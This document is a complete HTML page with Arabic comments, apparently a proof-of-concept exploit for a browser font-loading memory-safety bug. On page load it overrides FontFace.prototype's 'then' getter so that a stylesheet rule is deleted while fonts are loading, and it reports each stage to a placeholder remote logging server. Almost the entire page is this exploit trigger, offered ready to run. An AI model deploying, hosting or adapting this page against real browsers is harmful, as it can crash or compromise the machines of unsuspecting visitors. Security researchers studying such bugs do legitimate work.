<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: 'x'; src: url('nonexistent.woff'); }
    </style>
</head>
<body>
    <h1>مراقب النظام - وضع البحث</h1>
    <script>
        // إعداد الاتصال بالكونسول البعيد
        const REMOTE_URL = "https://your-server.com/log"; // ضع رابط السيرفر هنا

        function remoteLog(msg) {
            fetch(REMOTE_URL, {
                method: 'POST',
                body: JSON.stringify({ log: msg, time: new Date().toLocaleTimeString() })
            });
        }

        window.onload = async () => {
            remoteLog("بدء تشغيل عملية الاختبار...");

            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    remoteLog("تم اعتراض الـ Promise - بدء الثغرة");
                    document.getElementById('s').sheet.deleteRule(0);
                    return undefined;
                }
            });

            try {
                document.fonts.load('1em x', 'AB');
                remoteLog("تم استدعاء load بنجاح");
            } catch (e) {
                remoteLog("خطأ في التنفيذ: " + e.message);
            }
        };
    </script>
</body>
</html>
